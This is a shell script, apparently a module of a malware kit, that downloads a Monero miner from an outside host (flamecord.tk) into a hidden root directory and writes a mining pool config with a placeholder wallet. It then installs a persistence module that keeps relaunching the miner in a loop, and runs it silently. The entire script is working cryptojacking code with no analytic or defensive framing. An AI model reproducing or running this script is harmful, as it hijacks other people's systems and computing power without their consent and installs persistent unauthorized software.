wget flamecord.tk/miner-`uname -m` -O /.__EL_SNEEDIO__/miner || curl -L flamecord.tk/miner-`uname -m` -o /.__EL_SNEEDIO__/miner
if ! test -f /.__EL_SNEEDIO__/miner; then
    echo could not download miner
    echo END
    exit
fi
cat > /.__EL_SNEEDIO__/config.json <<EOF
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "xmr.pool.gntl.co.uk:20009",
            "user": "thisconfigisinvalidandshouldbechangedFIXMEFIXME",
            "keepalive": true,
            "tls": true
        }
    ]
}
EOF

chmod +x /.__EL_SNEEDIO__/miner

cat > /.__EL_SNEEDIO__/modules.d/miner <<"EOF"
if test -f /.__EL_SNEEDIO__/miner.pid && test -d /proc/`cat /.__EL_SNEEDIO__/miner.pid`; then
    exit
fi
/.__EL_SNEEDIO__/.__EL_SNEEDIO__ -c 'while true; do /.__EL_SNEEDIO__/miner --log-file /.__EL_SNEEDIO__/miner.log; done' &
echo $! > /.__EL_SNEEDIO__/miner.pid
EOF

sh /.__EL_SNEEDIO__/modules.d/miner > /dev/null

echo suckies
echo END
